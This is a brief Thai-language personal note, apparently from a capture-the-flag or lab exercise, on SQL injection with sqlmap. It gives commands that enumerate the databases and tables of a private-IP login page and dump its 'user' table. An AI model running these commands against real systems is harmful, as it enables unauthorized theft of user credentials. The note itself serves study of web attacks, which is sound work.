#web
- tool ไว้ทำ sql injection
- หา url ที่มี get/pose
- sqlmap -u "`http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf`" --dbs : ดู database ทั้งหมด
- sqlmap -u "`http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf`" -D `ai` --tables : ดู tables ทั้งหมดใน database ai
- sqlmap -u "`http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf`" -D `ai` -T `user` --dump : ดู data ทั้งหมดใน table user จาก database ai